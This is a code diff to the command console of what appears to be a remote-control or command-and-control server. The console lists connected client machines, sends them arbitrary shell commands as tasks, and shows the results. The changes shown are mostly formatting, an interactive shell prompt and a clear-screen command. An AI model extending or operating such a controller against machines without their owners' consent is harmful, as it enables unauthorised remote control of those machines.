@@ -1,3 +1,5 @@
+import os
+
 def _require_client(current_client):
     if not current_client:
         print("no client selected")
@@ -27,12 +29,14 @@ def cmd_use(server, args, current_client):
 
 def cmd_users(server, args, current_client):
     if not server.clients:
-        print("no clients")
+        print("[+] no clients")
         return current_client
 
+    print()
     for cid, c in server.clients.items():
         marker = "*" if cid == current_client else " "
         print(f"{marker} {cid} | {c['hostname']} | {c['mac']}")
+    print()
     
     return current_client
 
@@ -46,14 +50,12 @@ def cmd_health(server, args, current_client):
 def cmd_shell(server, args, current_client):
     if not _require_client(current_client):
         return current_client
-        
-    if not _require_args(args, "shell <cmd>"):
-        return current_client
     
-    server.send_task(current_client, "shell", {
-        "cmd": " ".join(args)
-    })
-
+    cmd = " ".join(args) if args else input("$ ")
+    if not cmd:
+        return current_client
+          
+    server.send_task(current_client, "shell", {"cmd": cmd})
     return current_client
 
 def cmd_upload(server, args, current_client):
@@ -84,9 +86,19 @@ def cmd_results(server, args, current_client):
     if not _require_client(current_client):
         return current_client
 
-    for tid, r in server.clients[current_client]["results"].items():
-        print(f"{tid} [{r['status']}] -> {r['output']}")
+    results = server.clients[current_client]["results"]
 
+    if not results:
+        print(" no results")
+        return current_client
+
+    for i, (tid, r) in enumerate(results.items(), 1):
+        out = r["output"]
+        print(f"\n [{i}] {tid[:8]} [{r['status']}]")
+        output = out["stdout"] if r["status"] == "ok" else out["stderr"]
+        if output: print(f" {output.strip()}")
+    
+    print()
     return current_client
 
 def cmd_publish(server, args, current_client):
@@ -108,9 +120,13 @@ def cmd_disconnect(server, args, current_client):
     server.disconnect(current_client)
     return None
 
+def cmd_clear(server, args, current_client):
+    os.system("cls" if os.name == "nt" else "clear")
+    return current_client
+
 def cmd_help(server, args, current_client):
     for name, (_, desc) in COMMANDS.items():
-        print(f"    {name:<12} {desc}")
+        print(f"{name:<12} {desc}")
     return current_client
 
 COMMANDS = {    
@@ -126,4 +142,5 @@ COMMANDS = {
 
     "results":    (cmd_results,     "show task results"),
     "help":       (cmd_help,        "show this message"),
+    "clear":      (cmd_clear,       "clear the terminal"),
 }
